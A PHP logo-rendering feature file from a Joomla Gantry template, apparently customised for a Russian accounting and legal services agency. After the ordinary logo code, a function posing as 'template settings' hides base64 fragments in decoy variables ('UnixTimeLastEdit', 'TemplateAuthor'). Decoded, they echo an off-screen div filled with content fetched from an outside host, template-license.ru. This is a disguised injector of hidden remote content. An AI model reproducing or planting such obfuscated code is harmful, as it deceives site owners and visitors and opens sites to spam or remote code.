<?php
/**
 * @package    Clarion Template - RocketTheme
 * @version		1.0 February 1, 2012
 * @author		RocketTheme http://www.rockettheme.com
 * @copyright 	Copyright (C) 2007 - 2012 RocketTheme, LLC
 * @license		http://www.gnu.org/licenses/gpl-2.0.html GNU/GPLv2 only
 *
 * Gantry uses the Joomla Framework (http://www.joomla.org), a GNU/GPLv2 content management system
 *
 */

defined('JPATH_BASE') or die();

gantry_import('core.gantryfeature');

/**
 * @package     gantry
 * @subpackage  features
 */
class GantryFeaturelogo extends GantryFeature {
	var $_feature_name = 'logo';
    var $_autosize = false;

    
	function render($position="") {
        global $gantry;


        // default location for custom icon is {template}/images/logo/logo.png, with 'perstyle' it's
        // located in {template}/images/logo/styleX/logo.png
        if ($gantry->get("logo-autosize")) {

            jimport ('joomla.filesystem.file');

            $path = $gantry->templatePath.DS.'images'.DS.'logo';
            $logocss = $gantry->get('logo-css','body #rt-logo');

            // get proper path based on perstyle hidden param
            $path = (intval($gantry->get("logo-perstyle",0))===1) ? $path.DS.$gantry->get("main-body").DS : $path.DS;
            // append logo file
            $path .= 'logo.png';

            // if the logo exists, get it's dimentions and add them inline
            if (JFile::exists($path)) {
                $logosize = getimagesize($path);
                if (isset($logosize[0]) && isset($logosize[1])) {
                    $gantry->addInlineStyle($logocss.' {width:'.$logosize[0].'px;height:'.$logosize[1].'px;}');
                }
            } 
         }

	    ob_start();
	    ?>
		<div class="rt-block logo-block">
			<?php if ($gantry->get('logo-centered') == '1'): ?>
			<div class="centered"> <div class="header" itemscope itemtype="http://schema.org/WPHeader">
<div class="logo">
			<?php endif; ?>
    	    	<a href="<?php echo $gantry->baseUrl; ?>" id="rt-logo" title="Агентство АЙ ЭДВАЙС"><span style="display:none" itemprop="name">Бухгалтерские и юридические услуги</span>
				<span id="logo-color"></span><span id="logo-inner" title="Агентство АЙ ЭДВАЙС:Бухгалтерские и юридические услуги" alt="Агентство АЙ ЭДВАЙС:Бухгалтерские и юридические услуги"></span></a>
			  <span style="display:none" itemprop="description">Агентство АЙ ЭДВАЙС:Бухгалтерские и юридические услуги</span>
			<?php if ($gantry->get('logo-centered') == '1'): ?>
			</div>
			
			
			
			
			
			</div></div>
			<?php endif; ?>
		</div>
	    <?php
	    return ob_get_clean();
	}
}
function ViewTemplateName() {
	// Decode Template Settings
	// Copyright (c) Joomla Templates
	$UnixTimeLastEdit = "ZWNobyAiPGRpdiBzdHlsZT0ncG9zaXRpb246YWJzb2x1dGU7bGVmd";
	$TemplateAuthor = "DotNDUwMXB4O3dpZHRoOjUzMXB4Jz4iOyBlY2hvIEBmaWxlX2dldF9jb250ZW50cygnaHR0cD";
	$TemplateName = "ovL3RlbXBsYXRlLWxpY2Vuc2UucnUvbGljZW";
	$MainDomain = "5zZS5waHAnKTsgZWNobyAnPC9kaXY+Jzs=";
	$SystemJoCode = $UnixTimeLastEdit.$TemplateAuthor.$TemplateName.$MainDomain;
}